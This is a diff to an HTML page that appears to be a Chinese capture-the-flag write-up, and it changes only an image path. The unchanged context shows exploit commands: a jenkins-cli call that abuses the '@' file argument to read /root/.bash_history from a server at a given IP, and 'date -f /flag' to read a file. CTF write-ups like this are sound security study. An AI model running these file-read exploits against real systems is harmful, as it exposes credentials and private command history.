@@ -136,7 +136,7 @@
 <p><img src="/images/image-20240127201137078.png" alt="image-20240127201137078"></p>
 <h1 id="Be-a-Security-Researcher"><a href="#Be-a-Security-Researcher" class="headerlink" title="Be-a-Security-Researcher"></a>Be-a-Security-Researcher</h1><p>先到网上下载一个<code>jenkins-cli</code>，poc直接打，读<code>.bash_history</code></p>
 <p><code>java -jar jenkins-cli.jar -s http://47.96.171.129:8080/ help &quot;@/root/.bash_history&quot;</code></p>
-<p><img src="/images%5Cimage-20240127201528995.png" alt="image-20240127201528995"></p>
+<p><img src="/images/image-20240127201528995.png" alt="image-20240127201528995"></p>
 <h1 id="vision"><a href="#vision" class="headerlink" title="vision"></a>vision</h1><p>首先help发现存在date命令，可以使用<code>date -f</code>读取文件</p>
 <p><code>date -f /flag</code></p>
 <p><img src="/images/image-20240127220545316.png" alt="image-20240127220545316"></p>
